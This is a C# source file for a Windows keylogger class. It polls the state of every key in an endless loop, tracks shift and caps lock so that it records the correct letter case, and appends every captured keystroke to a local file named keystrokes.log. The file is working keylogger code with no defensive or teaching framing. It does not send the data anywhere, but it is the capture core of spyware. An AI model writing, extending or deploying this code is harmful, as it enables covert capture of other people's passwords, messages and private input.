using System.Text;

namespace Keystrokes
{
    public class KeystrokesManager
    {
        private readonly StringBuilder _buffer = new(1000);

        public int Step { get; }

        public KeystrokesManager(int step = 140)
        {
            Step = step;
        }

        public async Task CaptureAsync()
        {
            while (true)
            {
                Thread.Sleep(Step);
                bool hasCaptured = CaptureKeystroke();
                if (!hasCaptured)
                {
                    continue;
                }

                await FlushAsync().ConfigureAwait(false);
            }
        }

        private bool CaptureKeystroke()
        {
            bool hasCaptured = false;

            for (int i = 0; i < 255; ++i)
            {
                int state = User32.GetAsyncKeyState(i);
                if (state == 0)
                {
                    continue;
                }

                bool isLowerCase = !IsUpperCase();
                hasCaptured = true;

                Keys key = (Keys)i;

                if (SpecialCharsParser.TryParseKey(key, out char? c))
                {
                    _buffer.Append(c);
                }
                else
                {
                    string strKey = key.ToString();

                    if (strKey.Length > 1)
                    {
                        strKey = $"<{strKey}>";
                    }
                    else if (isLowerCase)
                    {
                        strKey = strKey.ToLowerInvariant();
                    }

                    _buffer.Append(strKey);
                }
            }

            return hasCaptured;
        }

        private static bool IsUpperCase()
        {
            bool shift = false;
            short shiftState = (short)User32.GetAsyncKeyState(16);
            // Keys.ShiftKey does not work, so I put its numeric equivalent
            if ((shiftState & 0x8000) == 0x8000)
            {
                shift = true;
            }
            bool caps = Console.CapsLock;
            bool isBig = shift | caps;
            return isBig;
        }

        public async Task FlushAsync()
        {
            await File.AppendAllTextAsync("keystrokes.log", _buffer.ToString()).ConfigureAwait(false);
            _buffer.Clear();
        }
    }
}
